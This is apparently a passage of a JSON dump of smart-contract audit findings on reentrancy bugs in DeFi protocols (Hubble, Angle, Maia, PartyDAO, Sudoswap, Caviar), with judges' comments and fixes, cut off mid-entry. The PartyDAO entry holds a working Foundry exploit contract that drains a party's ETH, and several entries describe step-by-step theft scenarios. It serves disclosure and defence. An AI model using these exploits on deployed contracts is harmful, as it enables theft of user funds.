reentrancy across functions, while the root cause of issues marked as dupes is that there is no gas limit. I suggest that this issue be separated and the dupes groped together as separate issues.\n> \n> Edit:\n> Missed #195. That and this should be considered a separate issue\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nSee escalation https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/116\n\nThere are a lot of ways to consume all gas in external call (reentrancy to expand the queue size, gas token, for loop, swap, etc....), cannot count each of them as duplicates \n\nI think grouping all these issue about wasting gas in external call to one issue make sense, root cause is gas limit not capped.\n\n**0xArcturus**\n\n Agreed with escalation, \nas also mentioned in [#195](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/195), the root cause of this is the lack of reentrancy guard and the `withdrawals.length` changing during execution. This attack can bloat the queue by reentering with a single withdraw call, while the dupes are focused on consuming gas in a single call.\n\n**hrishibhat**\n\nResult:\nMedium\nHas duplicates\nAgree with the escalation that this should be a separate issue along with #195 \n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [IAm0x52](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/153/#issuecomment-1643577079): accepted",
      "summary": "\nThis bug report is about malicious user griefing withdrawing users via VUSD reentrancy. Two users, 0x3e84fa45 and 0x52, found an issue in the VUSD.sol contract that allows a malicious user to withdraw VUSD to a malicious contract, deposit the received gas token, and immediately withdraw it. This would lengthen the queue and force users to process all the malicious withdrawals before being able to process their own. The root cause of this issue is that both mintWithReserve and withdraw/withdrawTo lack the reentrant modifier allowing malicious reentrancy. The impact of this vulnerability is that malicious user can maliciously reenter VUSD to grief users via unnecessary gas wastage. The recommended solution is to add the nonreentrant modifer to mintWithReserve withdraw and withdrawTo. After discussion and review, the escalations were accepted and the bug was marked as medium with duplicates.",
      "report_date": {},
      "contest_prize_txt": "40000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/72",
      "sponsor_name": null,
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/153",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "72",
      "slug": "m-7-malicious-user-can-grief-withdrawing-users-via-vusd-reentrancy-sherlock-none-hubble-exchange-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Hubble Exchange",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Hubble Exchange",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Derivatives"
            },
            "score": 1
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "20815",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "934",
      "title": "[H-01] Possible reentrancy during redemption/swap",
      "content": "\nRedeemers might charge more collaterals during redemption/swap by the reentrancy attack.\n\n### Proof of Concept\n\nRedeemers can redeem the agToken for collaterals in `Redeemer` contract and `_redeem()` burns the agToken and transfers the collaterals.\n\n```solidity\n    function _redeem(\n        uint256 amount,\n        address to,\n        uint256 deadline,\n        uint256[] memory minAmountOuts,\n        address[] memory forfeitTokens\n    ) internal returns (address[] memory tokens, uint256[] memory amounts) {\n        TransmuterStorage storage ts = s.transmuterStorage();\n        if (ts.isRedemptionLive == 0) revert Paused();\n        if (block.timestamp > deadline) revert TooLate();\n        uint256[] memory subCollateralsTracker;\n        (tokens, amounts, subCollateralsTracker) = _quoteRedemptionCurve(amount);\n        // Updating the normalizer enables to simultaneously and proportionally reduce the amount\n        // of stablecoins issued from each collateral without having to loop through each of them\n        _updateNormalizer(amount, false);\n\n        IAgToken(ts.agToken).burnSelf(amount, msg.sender); //@audit-info burn agToken\n\n        address[] memory collateralListMem = ts.collateralList;\n        uint256 indexCollateral;\n        for (uint256 i; i < amounts.length; ++i) {\n            if (amounts[i] < minAmountOuts[i]) revert TooSmallAmountOut();\n            // If a token is in the `forfeitTokens` list, then it is not sent as part of the redemption process\n            if (amounts[i] > 0 && LibHelpers.checkList(tokens[i], forfeitTokens) < 0) {\n                Collateral storage collatInfo = ts.collaterals[collateralListMem[indexCollateral]];\n                if (collatInfo.onlyWhitelisted > 0 && !LibWhitelist.checkWhitelist(collatInfo.whitelistData, to))\n                    revert NotWhitelisted();\n                if (collatInfo.isManaged > 0)\n                    LibManager.release(tokens[i], to, amounts[i], collatInfo.managerData.config);\n                else IERC20(tokens[i]).safeTransfer(to, amounts[i]); //@audit reentrancy\n            }\n            if (subCollateralsTracker[indexCollateral] - 1 <= i) ++indexCollateral;\n        }\n        emit Redeemed(amount, tokens, amounts, forfeitTokens, msg.sender, to);\n    }\n```\n\nDuring the collateral transfers(direct transfer or in `LibManager.release()`), there might be a hook for the recipient in the case of ERC777 tokens.\n\nThen the recipient might charge more collaterals by reentrancy like this.\n\n1.  Let's suppose there are 2 collaterals `colA` and `colB`. The transmuter contract contains 1000 amounts of `colA` and `colB`. Alice has 20 amounts of agToken.\n2.  At the first time, Alice calls `redeem()` with 10 amounts of agToken and she should receive 10 amounts of `colA` and `colB`.\n3.  As `colA` is an ERC777 token, she calls `redeem(10)` again inside the hook after the [colA transfer](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Redeemer.sol#L131).\n4.  During the second redemption, total collaterals will be `colA = 990, colB = 1000` because `colB` isn't transferred in the first redemption yet.\n5.  After all, Alice will receive more collaterals in the second redemption from [this calculation](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Redeemer.sol#L167).\n\nI think a similar reentrancy attack might be possible during the swap as well.\n\n### Recommended Mitigation Steps\n\nI think we should add the `nonReentrant` modifier to the major functions like `redeem()/swap()`.\n\n**[Picodes (Angle) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-06-angle-findings/issues/24#issuecomment-1628650145):**\n > Valid. We had this in mind but thought it was ok as we don't plan to accept collaterals with callbacks. However better than sorry and we may add the modifier.\n\n**[hansfriese (Judge) commented](https://github.com/code-423n4/2023-06-angle-findings/issues/24#issuecomment-1628722575):**\n > @Picodes - `LibManager.release()` is called during the redemption and it might have a callback although the governance doesn't accept collaterals with hooks.\n> \n> Because the assumption is practical enough and the users can steal collaterals directly, will keep as High.\n\n**[Angle mitigated](https://github.com/code-423n4/2023-07-angle-mitigation/blob/main/README.md#mitigations-to-be-reviewed):**\n> PR: https://github.com/AngleProtocol/angle-transmuter/commit/864c1c47cb550f8e337244f0f70409a171a4e671<br>\n> Adds a reentrancy guard to several functions.\n\n**Status:** Mitigation confirmed. Full details in reports from [auditor0517](https://github.com/code-423n4/2023-07-angle-mitigation-findings/issues/22), [Lambda](https://github.com/code-423n4/2023-07-angle-mitigation-findings/issues/6), and [Jeiwan](https://github.com/code-423n4/2023-07-angle-mitigation-findings/issues/13).\n\n\n\n***\n\n",
      "summary": "\nA bug report has been raised for the Angle Protocol's Redeemer contract, which is used to redeem agToken for collaterals. The bug is that a redeemer might be able to charge more collaterals during redemption/swap by the reentrancy attack. \n\nThe attack works by exploiting the ERC777 callback feature, which is present in some collaterals. When a redeemer calls the `redeem()` function with 10 amounts of agToken, they should receive 10 amounts of the collateral. However, if the collateral is an ERC777 token, the recipient can call `redeem(10)` again inside the hook after the collateral transfer. This will result in the redeemer receiving more collaterals than expected. \n\nThe team at Angle Protocol has recommended adding the `nonReentrant` modifier to the major functions like `redeem()/swap()`. This mitigation was confirmed by the auditor, and full details can be found in the reports from auditor0517, Lambda, and Jeiwan.",
      "report_date": {},
      "contest_prize_txt": "$52,500 USDC",
      "contest_link": "https://code4rena.com/reports/2022-01-dev-test-repo",
      "sponsor_name": "Angle Protocol",
      "sponsor_link": "",
      "quality_score": 3,
      "general_score": 2,
      "source_link": "https://code4rena.com/reports/2022-01-dev-test-repo",
      "github_link": "https://github.com/code-423n4/2023-06-angle-findings/issues/24",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "255",
      "slug": "h-01-possible-reentrancy-during-redemptionswap-code4rena-angle-protocol-angle-protocol-invitational-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Angle Protocol",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Angle Protocol",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "ERC777"
          }
        }
      ]
    },
    {
      "id": "26099",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "922",
      "title": "[M-30] A user can call `callOutSigned` without paying for gas by reentering `anyExecute` with Virtual Account",
      "content": "\n`Virtual account` can perform external calls during the root chain execution process. If it calls `callOut` at the Arbitrum Branch Bridge Agent, the call `anyExecute` in Root Bridge Agent will be reentered. The call `lock` will not work if a user initiates the process on another branch chain. Call `_payExecutionGas` will not charge gas for the reentrancy call. Meanwhile, the storage variables `initialGas` and `userFeeInfo` will be deleted. As a result, no gas will be charged for the original call.\n\n### Proof of Concept\n\n    function anyExecute(bytes calldata data)\n        external\n        virtual\n        requiresExecutor\n        returns (bool success, bytes memory result)\n    {\n        uint256 _initialGas = gasleft();\n        uint24 fromChainId;\n        UserFeeInfo memory _userFeeInfo;\n\n        if (local`AnyCall`ExecutorAddress == msg.sender) {\n            initialGas = _initialGas;\n            (, uint256 _fromChainId) = _getContext();\n            fromChainId = _fromChainId.toUint24();\n\n            _userFeeInfo.depositedGas = _gasSwapIn(\n                uint256(uint128(bytes16(data[data.length - PARAMS_GAS_IN:data.length - PARAMS_GAS_OUT]))), fromChainId).toUint128();\n            _userFeeInfo.gasToBridgeOut = uint128(bytes16(data[data.length - PARAMS_GAS_OUT:data.length]));\n        } else {\n            fromChainId = localChainId;\n            _userFeeInfo.depositedGas = uint128(bytes16(data[data.length - 32:data.length - 16]));\n            _userFeeInfo.gasToBridgeOut = _userFeeInfo.depositedGas;\n        }\n\n        if (_userFeeInfo.depositedGas < _userFeeInfo.gasToBridgeOut) {\n            _forceRevert();\n            return (true, \"Not enough gas to bridge out\");\n        }\n\n        userFeeInfo = _userFeeInfo;\n\n        // execution part\n        ............\n\n        if (initialGas > 0) {\n            _payExecutionGas(userFeeInfo.depositedGas, userFeeInfo.gasToBridgeOut, _initialGas, fromChainId);\n        }\n    }\n\n<!---->\n\n    function _payExecutionGas(uint128 _depositedGas, uint128 _gasToBridgeOut, uint256 _initialGas, uint24 _fromChain) internal {\n        delete(initialGas);\n        delete(userFeeInfo);\n\n        if (_fromChain == localChainId) return;\n\n        uint256 availableGas = _depositedGas - _gasToBridgeOut;\n        uint256 minExecCost = tx.gasprice * (MIN_EXECUTION_OVERHEAD + _initialGas - gasleft());\n        if (minExecCost > availableGas) {\n            _forceRevert();\n            return;\n        }\n\n        _replenishGas(minExecCost);\n\n        accumulatedFees += availableGas - minExecCost;\n    }\n\nDuring the reentrancy call, `initialGas` will not be modified before the execution part; `_payExecutionGas` will be invoked, but it will directly return after deleting `initialGas` and `userFeeInfo`. As a result, after the execution part of the original call, `_payExecutionGas` will be passed, as `initialGas` is now zero.\n\n### Recommended Mitigation Steps\n\nStore `initialGas` and `userFeeInfo` in memory as local variables inside `anyExecute`.\n\n### Assessed type\n\nReentrancy\n\n**[Trust (judge) decreased severity to Medium](https://github.com/code-423n4/2023-05-maia-findings/issues/331#issuecomment-1649558092)**\n\n**[0xBugsy (Maia) confirmed](https://github.com/code-423n4/2023-05-maia-findings/issues/331#issuecomment-1650299437)**\n\n**[0xBugsy (Maia) commented](https://github.com/code-423n4/2023-05-maia-findings/issues/331#issuecomment-1658093666):**\n > We recognize the audit's findings on Anycall Gas Management. These will not be rectified due to the upcoming migration of this section to LayerZero.\n> \n\n***\n\n",
      "summary": "\nThis bug report is about a reentrancy vulnerability in the root chain execution process of the virtual account. If the callOut is initiated at the Arbitrum Branch Bridge Agent, the call anyExecute in Root Bridge Agent will be reentered. This causes the lock call to not work if the user initiates the process on another branch chain. In addition, the call _payExecutionGas will not charge gas for the reentrancy call and the storage variables initialGas and userFeeInfo will be deleted. As a result, no gas will be charged for the original call.\n\nThe recommended mitigation step is to store initialGas and userFeeInfo in memory as local variables inside anyExecute. The severity of this bug has been decreased to Medium by the Trust (judge) and it has been confirmed by 0xBugsy (Maia). However, due to the upcoming migration of this section to LayerZero, it will not be rectified.",
      "report_date": {},
      "contest_prize_txt": "$300,500 USDC",
      "contest_link": "https://code4rena.com/reports/2023-05-maia",
      "sponsor_name": "Maia DAO Ecosystem",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2023-05-maia",
      "github_link": "https://github.com/code-423n4/2023-05-maia-findings/issues/331",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "242",
      "slug": "m-30-a-user-can-call-calloutsigned-without-paying-for-gas-by-reentering-anyexecute-with-virtual-account-code4rena-maia-dao-ecosystem-maia-dao-ecosystem-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Maia DAO Ecosystem",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Maia DAO Ecosystem",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 202630.75
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 202630.75
          },
          {
            "protocols_protocolcategory": {
              "title": "Liquidity manager"
            },
            "score": 202630.75
          },
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 202630.75
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "20143",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 5,
      "protocol_id": "153",
      "title": "[M-06] Reentrancy guard in `rageQuit()` can be bypassed",
      "content": "\nThe reentrancy guard present in the `rageQuit()` function can be bypassed by host accounts, leading to reentrancy attack vectors and loss of funds.\n\nThe new `rageQuit()` function can be used by party members to exit their position and obtain their share of the tokens held by the party contract. In order to prevent function reentrancy while sending ETH or transferring ERC20 tokens, the implementation reuses the `rageQuitTimestamp` variable as a guard to check if the function is being called again while executing.\n\n<https://github.com/code-423n4/2023-05-party/blob/main/contracts/party/PartyGovernanceNFT.sol#L293-L353>\n\n```solidity\n293:     function rageQuit(\n294:         uint256[] calldata tokenIds,\n295:         IERC20[] calldata withdrawTokens,\n296:         address receiver\n297:     ) external {\n298:         // Check if ragequit is allowed.\n299:         uint40 currentRageQuitTimestamp = rageQuitTimestamp;\n300:         if (currentRageQuitTimestamp != ENABLE_RAGEQUIT_PERMANENTLY) {\n301:             if (\n302:                 currentRageQuitTimestamp == DISABLE_RAGEQUIT_PERMANENTLY ||\n303:                 currentRageQuitTimestamp < block.timestamp\n304:             ) {\n305:                 revert CannotRageQuitError(currentRageQuitTimestamp);\n306:             }\n307:         }\n308: \n309:         // Used as a reentrancy guard. Will be updated back after ragequit.\n310:         delete rageQuitTimestamp;\n             \n             ...\n             \n349:         // Update ragequit timestamp back to before.\n350:         rageQuitTimestamp = currentRageQuitTimestamp;\n351: \n352:         emit RageQuit(tokenIds, withdrawTokens, receiver);\n353:     }\n```\n\nThe implementation deletes the value of `rageQuitTimestamp` (which sets it to zero) in line 310. The intention is to use this variable to prevent reentrancy, as setting it to zero will block any call due to the check in line 303, `block.timestamp` will be greater than zero and will lead to the revert in line 305. After NFTs are burned and tokens are transferred, the function restores the original value in line 350.\n\nThis reentrancy guard can still be bypassed using `setRageQuit()`. If execution control is transferred to the attacker, then the attacker can call `setRageQuit()` to reset the value to anything greater than `block.timestamp`, allowing the reentrancy on the `rageQuit()` function. Note that this would require the attacker to be a party host or be in complicity with a party host.\n\nThe general scenario to trigger the reentrancy is as follows:\n\n1.  User calls `rageQuit()`.\n2.  ETH or ERC20 transfers control to the attacker. This can be in different forms:\n    *   ETH transfers to contracts that invoke the `receive()` or `fallback()` function.\n    *   Variations of the ERC20 tokens that have callbacks during transfers (e.g. ERC777)\n    *   Poisoned ERC20 implementation that receives control during the `transfer()` call itself.\n3.  Attacker resets the `rageQuitTimestamp` by calling `setRageQuit(block.timestamp + 1)`.\n4.  Attacker reenters the `rageQuit()` function.\n\nThe issue can be exploited to disable the reentrancy guard in the `rageQuit()` function, leading to further attacks. We will explore a scenario of potential loss of funds in the next section.\n\n### Proof of Concept\n\nThe following is an adaptation of the test `testRageQuit_cannotReenter()` present in the PartyGovernanceNFT.t.sol test suite, with minimal variations to enable the described attack.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/9a9868c7c3f540811eff6853db14bfc6).\n\n```solidity\nfunction test_PartyGovernanceNFT_ReentrancyAttack() external {\n   address alice = makeAddr(\"alice\");\n   address host = makeAddr(\"host\");\n\n   (Party party, , ) = partyAdmin.createParty(\n      partyImpl,\n      PartyAdmin.PartyCreationMinimalOptions({\n            host1: address(this),\n            host2: host,\n            passThresholdBps: 5100,\n            totalVotingPower: 100,\n            preciousTokenAddress: address(toadz),\n            preciousTokenId: 1,\n            rageQuitTimestamp: 0,\n            feeBps: 0,\n            feeRecipient: payable(0)\n      })\n   );\n\n   vm.prank(address(this));\n   party.setRageQuit(uint40(block.timestamp) + 1);\n\n   // Mint voting NFTs, alice and host have both 50%\n   vm.prank(address(partyAdmin));\n   uint256 aliceTokenId = party.mint(alice, 50, alice);\n   vm.prank(address(partyAdmin));\n   uint256 hostTokenId = party.mint(host, 50, host);\n\n   // Host (attacker) deploys malicious ReenteringContract\n   ReenteringContract reenteringContract = new ReenteringContract(party, hostTokenId, host);\n\n   // Host sends his NFT to the contract\n   vm.prank(host);\n   party.transferFrom(host, address(reenteringContract), hostTokenId);\n\n   // Host transfer host feature to contract\n   vm.prank(host);\n   party.abdicateHost(address(reenteringContract));\n\n   // Simulate there is 1 ETH in the party\n   vm.deal(address(party), 1 ether);\n\n   // Alice decides to rage quit\n\n   IERC20[] memory tokens = new IERC20[](2);\n   tokens[0] = IERC20(address(reenteringContract));\n   tokens[1] = IERC20(ETH_ADDRESS);\n\n   uint256[] memory tokenIds = new uint256[](1);\n   tokenIds[0] = aliceTokenId;\n\n   vm.prank(alice);\n   party.rageQuit(tokenIds, tokens, alice);\n\n   // Alice has 0 ETH while the host (attacker) has all the funds\n   assertEq(alice.balance, 0);\n   assertEq(host.balance, 1 ether);\n}\n\ncontract ReenteringContract is ERC721Receiver {\n    Party party;\n    uint256 tokenId;\n    address attacker;\n\n    constructor(Party _party, uint256 _tokenId, address _attacker) {\n        party = _party;\n        tokenId = _tokenId;\n        attacker = _attacker;\n    }\n\n    function balanceOf(address) external returns (uint256) {\n        return 1337;\n    }\n\n    function transfer(address, uint256) external returns (bool) {\n        // Disable reentrancy guard\n        party.setRageQuit(uint40(block.timestamp + 1));\n\n        // Return host to attacker\n        party.abdicateHost(attacker);\n\n        // Execute attack\n        IERC20[] memory tokens = new IERC20[](1);\n        tokens[0] = IERC20(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);\n        uint256[] memory tokenIds = new uint256[](1);\n        tokenIds[0] = tokenId;\n        party.rageQuit(tokenIds, tokens, address(this));\n        return true;\n    }\n\n    fallback() external payable {\n        // sends funds to attacker\n        payable(attacker).transfer(address(this).balance);\n    }\n}\n```\n\n### Recommendation\n\nImplement a reentrancy guard using a dedicated variable that acts as the flag, such as the one available in the [OpenZeppelin contracts library](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard).\n\nAlternatively, if the intention is to reuse the same `rageQuitTimestamp` variable, set it temporarily to  `DISABLE_RAGEQUIT_PERMANENTLY` instead of zero. This will prevent calling `setRageQuit()` to reset the `rageQuitTimestamp` variable while also blocking calls to `rageQuit()`.\n\n### Assessed type\n\nReentrancy\n\n**[cccz (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-05-party-findings/issues/13#issuecomment-1569494102):**\n > This attack scenario requires the victim to add malicious ERC20 tokens to the withdrawTokens parameter, and since this is not directly compromising user assets (which requires certain external requirements), consider M.\n\n**[0xble (Party) confirmed](https://github.com/code-423n4/2023-05-party-findings/issues/13#issuecomment-1572312651)**\n\n*Note: for full discussion, see [here](https://github.com/code-423n4/2023-05-party-findings/issues/13).*\n\n***\n\n",
      "summary": "\nThe `rageQuit()` function in the PartyGovernanceNFT contract allows party members to exit their position and obtain their share of the tokens held by the party contract. To prevent function reentrancy while sending ETH or transferring ERC20 tokens, the implementation uses the `rageQuitTimestamp` variable as a guard to check if the function is being called again while executing. However, a bug in the implementation allows the reentrancy guard to be bypassed by host accounts, leading to reentrancy attack vectors and loss of funds. \n\nThe `rageQuitTimestamp` variable is set to zero in line 310, which blocks any call due to the check in line 303, `block.timestamp` will be greater than zero and will lead to the revert in line 305. After NFTs are burned and tokens are transferred, the function restores the original value in line 350. This allows an attacker to call `setRageQuit()` to reset the value to anything greater than `block.timestamp`, allowing the reentrancy on the `rageQuit()` function. \n\nThe general scenario to trigger the reentrancy is as follows: \n1. User calls `rageQuit()`.\n2. ETH or ERC20 transfers control to the attacker. \n3. Attacker resets the `rageQuitTimestamp` by calling `setRageQuit(block.timestamp + 1)`.\n4. Attacker reenters the `rageQuit()` function.\n\nThe issue can be exploited to disable the reentrancy guard in the `rageQuit()` function, leading to further attacks. To mitigate this issue, it is recommended to implement a reentrancy guard using a dedicated variable that acts as the flag, such as the one available in the OpenZeppelin contracts library. Alternatively, the `rageQuitTimestamp` variable can be temporarily set to `DISABLE_RAGEQUIT_PERMANENTLY` instead of zero. This will prevent calling `setRageQuit()` to reset the `rageQuitTimestamp` variable while also blocking calls to `rageQuit()`.",
      "report_date": {},
      "contest_prize_txt": "$17,050 USDC",
      "contest_link": "https://code4rena.com/reports/2023-05-party",
      "sponsor_name": "PartyDAO",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 4,
      "source_link": "https://code4rena.com/reports/2023-05-party",
      "github_link": "https://github.com/code-423n4/2023-05-party-findings/issues/13",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "245",
      "slug": "m-06-reentrancy-guard-in-ragequit-can-be-bypassed-code4rena-partydao-party-dao-invitational-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "PartyDAO",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "PartyDAO",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Payments"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "18297",
      "kind": "PDF",
      "auditfirm_id": "6",
      "impact": "MEDIUM",
      "finders_count": 5,
      "protocol_id": "825",
      "title": "balanceOf() can be circumvented via reentrancy and two pairs",
      "content": "## Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\nLSSVMPairERC1155.sol#L222-L246\n\n## Description\nA reentrancy issue can occur if two pairs with the same ERC1155 NFTid are deployed. Via a call to swap NFTs, the ERC1155 callback `onERC1155BatchReceived()` is called. This callback can start a second NFT swap via a second pair. As the second pair has its own reentrancy modifier, this is allowed. \n\nThis way, the `balanceOf()` check of `_takeNFTsFromSender()` can be circumvented. If a reentrant call to a second pair supplies a sufficient amount of NFTs, then the `balanceOf()` check of the original call can be satisfied at the same time. \n\nWe haven't found a realistic scenario to abuse this with the current routers. Permissionless routers will certainly increase the risk as they can abuse `isRouter == true`. If the router is malicious, then it also has other ways to steal the NFTs; however, with the reentrancy scenario, it might be less obvious this is happening.\n\n**Note:** ERC777 tokens also contain such a callback and have the same interface as ERC20, so they could be used in an ERC20 pair.\n\n```solidity\nfunction _takeNFTsFromSender(IERC1155 _nft, uint256 numNFTs, bool isRouter, address routerCaller) ... {\n    ...\n    if (isRouter) {\n        ...\n        uint256 beforeBalance = _nft.balanceOf(_assetRecipient, _nftId);\n        ...\n        router.pairTransferERC1155From(...); // reentrancy with other pair\n        require((_nft.balanceOf(_assetRecipient, _nftId) - beforeBalance) == numNFTs, ...); // circumvented , !\n    } else {\n        ...\n    }\n}\n```\n\n## Recommendation\n1. Thoroughly verify routers before whitelisting them.\n2. To protect against reentrancy issues involving multiple pairs, consider putting the reentrancy storage variable in a common location, for example, in the `LSSVMPairFactory`.\n\n## Follow-up\n- **Sudorandom Labs:** Solved in PR#83 and PR#93.\n- **Spearbit:** Verified that this is fixed by PR#83 and PR#93.",
      "summary": "\nThis bug report is about a reentrancy issue that can occur if two pairs with the same ERC1155 NFTid are deployed. The issue is that the ERC1155 callback onERC1155BatchReceived() is called, which can start a second NFT swap via a second pair. This way, the balanceOf() check of _takeNFTsFromSender() can be circumvented. It is noted that ERC777 tokens also contain such a callback and have the same interface as ERC20, so they could be used in an ERC20 pair.\n\nThe recommendation to protect against this issue is to thoroughly verify routers before whitelisting them and to consider putting the reentrancy storage variable on a common location, for example in the LSSVMPairFactory. Sudorandom Labs and Spearbit have both solved this issue with PR#83 and PR#93.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 4,
      "general_score": 5,
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
      "pdf_page_from": 17,
      "contest_id": "",
      "slug": "balanceof-can-be-circumvented-via-reentrancy-and-two-pairs-spearbit-sudoswap-lssvm2-pdf",
      "firm_name": "Spearbit",
      "firm_logo_square": "spearbit_square.png",
      "protocol_name": "Sudoswap LSSVM2",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
      },
      "protocols_protocol": {
        "name": "Sudoswap LSSVM2",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "16254",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 9,
      "protocol_id": "76",
      "title": "[M-09] Malicious royalty recipient can steal excess eth from buy orders",
      "content": "\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L268>\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L140-L143>\n\n### Impact\n\nUsers that submit single or bulk Buy orders through `EthRouter.sol` can have their excess eth stolen by a malicious royalty recipient.\n\n### Proof of Concept\n\n**Introduction**\n\nThe `buy(...)` function in `PrivatePool.sol` refunds excess ether back to `EthRouter.sol` and\nthen pays a royalty amount to a royalty recipient. The order is the following:\n\n```solidity\n// refund any excess ETH to the caller\nif (msg.value > netInputAmount) msg.sender.safeTransferETH(msg.value - netInputAmount);\n```\n\n```solidity\nif (payRoyalties) {\n    ...\nelse {\n    recipient.safeTransferETH(royaltyFee);\n}\n```\n\nThis turns out to be dangerous since now `buy(...)` in `EthRouter.sol` can be reentered from the fallback function of a royalty recipient. In the fallback function the attacker would call `buy` in the `EthRouter.sol` with an empty `Buy[] buys calldata`, `deadline=0` and `payRoyalties = false` which will skip the `for` loop in `buy(...)`, since `buys` is empty, and would reach the following block of code:\n\n```solidity\n// refund any surplus ETH to the caller\nif (address(this).balance > 0) {\n    msg.sender.safeTransferETH(address(this).balance);\n}\n```\n\nSince now `msg.sender` is the royalty recipient he would receive all the ether that is currently residing in `EthRouter.sol` while the original `buy(...)` triggered by the user hasn't yet finished.\n\nBefore supplying a PoC implementation in Foundry, there are a few caveats to be noted.\n\nFirstly, this issue can be more easily reproduced by assuming that the malicious royalty recipient would come either from a single `Buy` order consisting of a single `tokenId` or multiple `Buy` orders where the `tokenId` with the malicious royalty recipient is the last `tokenId` in the array of the last `Buy` order. \n\nIn the case of the `tokenId` associated with the malicious royalty recipient being positioned NOT in last place in the `tokenIds[]` array in the last `Buy` order we would have to write a `fallback` function that after collecting all the ether in `EthRouter.sol` somehow extracts information of how much ether would be needed to successfully complete the rest of the `buy(...)` invocations (that will be called on the rest of the `tokenIds[]`) and sends that ether back to `EthRouter.sol` so that the whole transaction doesn't revert due to `EthRouter.sol` being out of funds. In the presented PoC implementation it is assumed that `tokenIds` has a single token or the malicious 